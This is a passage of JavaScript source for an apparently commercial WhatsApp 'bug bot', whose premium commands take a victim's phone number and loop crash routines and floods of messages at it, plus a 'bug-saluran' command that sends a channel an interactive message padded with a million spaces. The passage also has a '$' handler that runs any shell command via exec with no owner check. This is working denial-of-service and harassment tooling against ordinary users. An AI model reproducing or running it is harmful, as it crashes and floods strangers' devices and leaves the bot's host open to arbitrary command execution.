afgan.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
afgan.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'darkness': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
afgan.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
afgan.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
afgan.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'santet': case 'santet1jam': case 'santetfullday': case 'santetcrash': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, { image: santet,  caption: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ` }, { quoted:m })
afgan.sendMessage(Pe, { image: santet,  caption: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ` }, { quoted:m })
afgan.sendMessage(Pe, { image: santet,  caption: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ` }, { quoted:m })
afgan.sendMessage(Pe, { image: santet,  caption: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ` }, { quoted:m })
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break


case 'androcrash': case 'gaskenafgan': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
afgan.sendMessage(Pe, {text: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
//=================================================//
case 'bugori': case 'bugbisnis': case 'bugmods': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'AFGANN ATTACK'}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`*sukses*`)
}
break


case 'philips1': case 'philips2': case 'philips3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
afgan.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
afgan.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
afgan.sendMessage(Pe, {text: '๖ۣۣۜJ'}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'polytron1': case 'polytron2': case 'polytron3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'ᚔ'}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'panasonic1': case 'panasonic2': case 'panasonic3': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return m.reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await m.reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
await lokascrash(Pe, afganrorr)
await virgamcrash(Pe, afganrorr)
await dokucrash(Pe, afganrorr)
await iponcrash(Pe, afganrorr)
await iponcrash(Pe)
await crashasu(Pe, afganrorr)
afgan.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
afgan.sendMessage(Pe, {text: 'ᚙ'}, {quoted:m})
lokascrash(Pe, afganrorr)
dokucrash(Pe, afganrorr)
virgamcrash(Pe, afganrorr)
iponcrash(Pe, afganrorr)
crashasu(Pe, afganrorr)
}
await reply(mess.bugrespon)
await m.reply(`_silahlan di cek, target sudah_ *c1*`)
}
break
case 'totalfitur':
const totalFitur = () =>{
            var mytext = fs.readFileSync("./afgan.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
afganreply(`Total Fitur Bot VVIP V3 Berjumlah : *${totalFitur()}*`)
break
case 'bug-saluran': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://whatsapp.com/channel/`)
reply(`In proses....`)
let result = args[0].split('https://whatsapp.com/channel/')[1];
let target = await afgan.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁̶⃰A̶f̶g̶a̶n̶n 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #afgannrorr"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: anggazyycrash })
await afgan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(1000)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
afgan.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})